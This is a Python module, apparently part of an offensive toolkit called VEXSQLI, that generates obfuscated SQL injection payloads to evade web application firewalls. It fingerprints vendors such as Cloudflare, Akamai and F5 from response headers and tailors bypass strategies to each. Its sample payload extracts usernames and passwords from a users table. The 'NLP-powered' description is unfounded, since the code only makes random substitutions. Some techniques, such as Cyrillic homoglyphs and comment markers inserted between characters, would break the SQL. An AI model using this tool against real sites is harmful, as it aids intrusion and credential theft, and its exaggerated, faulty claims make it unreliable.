# modules/vexsqli/core.py
"""
VEXSQLI.py - NLP-powered SQL Injection Payload Obfuscation
Bypass WAFs using Natural Language Processing techniques
"""

import random
import base64
import urllib.parse
from typing import List, Dict
import hashlib

class NLPProcessor:
    """Simula procesamiento NLP para ofuscación de payloads"""
    
    def __init__(self):
        self.homoglyphs = {
            'a': ['а', '@', '4'],
            'b': ['ь', '8', '13'],
            'c': ['с', '(', '<'],
            'e': ['е', '3'],
            'i': ['1', '!', '|'],
            'l': ['1', '|'],
            'o': ['0', '()'],
            's': ['$', '5'],
            't': ['7', '+']
        }
        
        self.encodings = [
            'url',
            'base64',
            'hex',
            'unicode',
            'html'
        ]
    
    def generate_variants(self, payload: str, count: int = 10) -> List[str]:
        """Genera múltiples variantes ofuscadas del payload"""
        variants = []
        
        for _ in range(count):
            variant = payload
            technique = random.choice(['homoglyph', 'encoding', 'comment', 'case'])
            
            if technique == 'homoglyph':
                variant = self._apply_homoglyphs(payload)
            elif technique == 'encoding':
                variant = self._apply_encoding(payload)
            elif technique == 'comment':
                variant = self._insert_comments(payload)
            elif technique == 'case':
                variant = self._random_case(payload)
            
            variants.append(variant)
        
        return variants
    
    def _apply_homoglyphs(self, text: str) -> str:
        """Reemplaza caracteres con homoglifos"""
        result = []
        for char in text:
            if char.lower() in self.homoglyphs and random.random() > 0.5:
                result.append(random.choice(self.homoglyphs[char.lower()]))
            else:
                result.append(char)
        return ''.join(result)
    
    def _apply_encoding(self, text: str) -> str:
        """Aplica diferentes codificaciones"""
        enc_type = random.choice(self.encodings)
        
        if enc_type == 'url':
            return urllib.parse.quote(text)
        elif enc_type == 'base64':
            return base64.b64encode(text.encode()).decode()
        elif enc_type == 'hex':
            return '0x' + text.encode().hex()
        elif enc_type == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in text)
        else:
            return text
    
    def _insert_comments(self, text: str) -> str:
        """Inserta comentarios SQL entre caracteres"""
        result = []
        comments = ['/**/', '/*!*/', '--', '#']
        
        for char in text:
            result.append(char)
            if random.random() > 0.3:
                result.append(random.choice(comments))
        
        return ''.join(result)
    
    def _random_case(self, text: str) -> str:
        """Cambia aleatoriamente entre mayúsculas y minúsculas"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)

class WAFBypassEngine:
    """Motor principal de bypass de WAFs"""
    
    def __init__(self):
        self.nlp = NLPProcessor()
        self.waf_signatures = {
            'cloudflare': ['__cfduid', 'cf-ray'],
            'akamai': ['akamai', 'aka'],
            'f5': ['bigip', 'f5'],
            'sucuri': ['sucuri'],
            'aws_waf': ['x-amz-cf-id', 'aws']
        }
    
    def detect_waf(self, headers: Dict) -> List[str]:
        """Detecta WAF basado en headers de respuesta"""
        detected = []
        headers_str = str(headers).lower()
        
        for waf, signatures in self.waf_signatures.items():
            for sig in signatures:
                if sig in headers_str:
                    detected.append(waf)
                    break
        
        return detected
    
    def generate_bypass_payloads(self, base_payload: str, waf_type: str = None) -> List[str]:
        """Genera payloads específicos para bypass según WAF"""
        
        # Estrategias específicas por WAF
        strategies = {
            'cloudflare': ['encoding', 'homoglyph'],
            'akamai': ['comment', 'case'],
            'f5': ['encoding', 'comment'],
            'default': ['encoding', 'homoglyph', 'comment', 'case']
        }
        
        strategy = strategies.get(waf_type, strategies['default'])
        all_variants = []
        
        for _ in range(20):  # Generar 20 payloads
            technique = random.choice(strategy)
            if technique == 'encoding':
                variant = self.nlp._apply_encoding(base_payload)
            elif technique == 'homoglyph':
                variant = self.nlp._apply_homoglyphs(base_payload)
            elif technique == 'comment':
                variant = self.nlp._insert_comments(base_payload)
            else:
                variant = self.nlp._random_case(base_payload)
            
            all_variants.append(variant)
        
        return all_variants

# Ejemplo de uso
if __name__ == "__main__":
    engine = WAFBypassEngine()
    test_payload = "UNION SELECT username,password FROM users"
    
    print("[*] Payload original:", test_payload)
    print("\n[*] Variantes ofuscadas:")
    
    variants = engine.generate_bypass_payloads(test_payload)
    for i, v in enumerate(variants[:5], 1):
        print(f"{i}. {v}")
